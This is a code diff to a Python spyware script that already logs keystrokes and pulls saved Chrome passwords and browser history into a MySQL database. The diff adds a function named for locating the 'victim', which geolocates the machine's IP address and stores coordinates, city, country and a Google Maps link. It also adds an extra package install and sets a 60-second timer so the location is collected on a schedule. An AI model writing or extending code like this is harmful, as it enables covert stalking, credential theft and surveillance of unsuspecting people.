@@ -4,7 +4,7 @@ import platform
 
 
 # Check and install required modules
-required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32']
+required_modules = ['pynput', 'mysql-connector-python', 'pyperclip', 'psutil','pycryptodome','pywin32','requests','geopy']
 
 for module in required_modules:
     try:
@@ -28,6 +28,8 @@ from datetime import timezone, datetime, timedelta
 import glob
 import shutil
 import sqlite3
+import requests
+from geopy.geocoders import Nominatim
 
 # Connect to MySQL database
 db = mysql.connector.connect(
@@ -108,6 +110,19 @@ CREATE TABLE IF NOT EXISTS browser_history (
     last_visit_time DATETIME NOT NULL
 )
 """
+# Create the location_info table if not exists
+create_location_info_table_query = """
+CREATE TABLE IF NOT EXISTS location_info (
+id INT AUTO_INCREMENT PRIMARY KEY,
+time DATETIME NOT NULL,
+latitude FLOAT,
+longitude FLOAT,
+city VARCHAR(255),
+country VARCHAR(255),
+address VARCHAR(255),
+google_maps_link VARCHAR(255)
+)
+"""
 
 try:
     cursor.execute(create_keystrokes_table_query)
@@ -117,6 +132,7 @@ try:
     cursor.execute(create_downloads_table_query)
     cursor.execute(create_chrome_passwords_table_query)
     cursor.execute(create_browser_history_table_query)
+    cursor.execute(create_location_info_table_query)
 
     db.commit()
 except mysql.connector.Error as err:
@@ -450,12 +466,51 @@ def extract_and_insert_browser_history():
         print(f"Error extracting browser history: {e}")
 
 
+# Modify the get_victim_location function to include new data and insert into the database
+def get_victim_location():
+    try:
+        # Use a different IP geolocation service to get the approximate location
+        ip_response = requests.get("https://ipinfo.io/json")
+        ip_data = ip_response.json()
+
+        if "loc" in ip_data:
+            latitude, longitude = map(float, ip_data["loc"].split(","))
+            city, country, address = (
+                ip_data.get("city", ""),
+                ip_data.get("country", ""),
+                ip_data.get("loc", ""),
+            )
+            current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+            # Create Google Maps link
+            google_maps_link = f"https://www.google.com/maps/place/{latitude},{longitude}/"
+
+            # Insert the location data into the location_info table
+            query = "INSERT INTO location_info (time, latitude, longitude, city, country, address, google_maps_link) " \
+                    "VALUES (%s, %s, %s, %s, %s, %s, %s)"
+            values = (current_time, latitude, longitude, city, country, address, google_maps_link)
+            cursor.execute(query, values)
+            db.commit()
+            print("Victim's location data inserted successfully.")
+        else:
+            print("Unable to retrieve location data from ipinfo.io.")
+            return
+
+    except requests.exceptions.RequestException as req_err:
+        print(f"Request error: {req_err}")
+    except Exception as e:
+        print(f"Error getting victim's location: {e}")
+
+
+
+
+
 
 
 
 
 # Set the time interval for keylogger data insertion (in seconds)
-interval = 10.0
+interval = 60.0
 
 
 
@@ -492,4 +547,10 @@ chrome_passwords_timer.start()
 # Schedule the browser history extraction and insertion to run at the specified interval
 browser_history_timer = Timer(interval, extract_and_insert_browser_history)
 browser_history_timer.start()
+
+
+#Feature : 8
+# Schedule the victim's location retrieval at the specified interval
+location_timer = Timer(interval, get_victim_location)
+location_timer.start()
 
